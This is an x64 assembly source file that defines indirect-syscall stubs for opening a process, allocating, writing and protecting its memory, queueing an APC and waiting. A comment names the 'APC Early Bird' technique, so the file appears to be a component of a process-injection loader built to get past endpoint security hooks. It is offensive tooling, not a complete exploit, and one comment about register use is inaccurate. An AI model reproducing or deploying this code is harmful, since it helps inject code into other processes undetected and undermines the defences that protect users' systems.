EXTERN SSNtOpenProcess:DWORD               
EXTERN AddrNtOpenProcess:QWORD  

EXTERN SSNtAllocateVirtualMemory:DWORD               
EXTERN AddrNtAllocateVirtualMemory:QWORD       

EXTERN SSNtWriteVirtualMemory:DWORD                  
EXTERN AddrNtWriteVirtualMemory:QWORD            

EXTERN SSNtQueueApcThread:DWORD                      
EXTERN AddrNtQueueApcThread:QWORD                

EXTERN SSNtWaitForSingleObject:DWORD                
EXTERN AddrNtWaitForSingleObject:QWORD          

EXTERN SSNtProtectVirtualMemory:DWORD                
EXTERN AddrNtProtectVirtualMemory:QWORD

.CODE  ; Start the code section

; Procedure for the NtOpenProcess syscall
NtOpen PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, SSNtOpenProcess               ; Move the syscall number into the eax register.
    jmp QWORD PTR [AddrNtOpenProcess]  ; Jump to the actual syscall.
NtOpen ENDP                        ; End of the procedure.


; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVM PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, SSNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [AddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVM ENDP                        ; End of the procedure.


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVM PROC
    mov r10, rcx
    mov eax, SSNtWriteVirtualMemory
    jmp QWORD PTR [AddrNtWriteVirtualMemory]
NtWriteVM ENDP


; Similar procedures for NtQueueApcThread syscalls (APC Early Bird)
NtQueueApcThreadStub PROC
    mov r10, rcx
    mov eax, SSNtQueueApcThread
    jmp QWORD PTR [AddrNtQueueApcThread]
NtQueueApcThreadStub ENDP


; Similar procedures for NtWaitForSingleObject syscalls
NtWFSObject PROC
    mov r10, rcx
    mov eax, SSNtWaitForSingleObject
    jmp QWORD PTR [AddrNtWaitForSingleObject]
NtWFSObject ENDP


; Similar procedures for NtProtectVirtualMemory syscalls
NtProtectVM PROC
    mov r10, rcx
    mov eax, SSNtProtectVirtualMemory
    jmp QWORD PTR [AddrNtProtectVirtualMemory]
NtProtectVM ENDP

END  
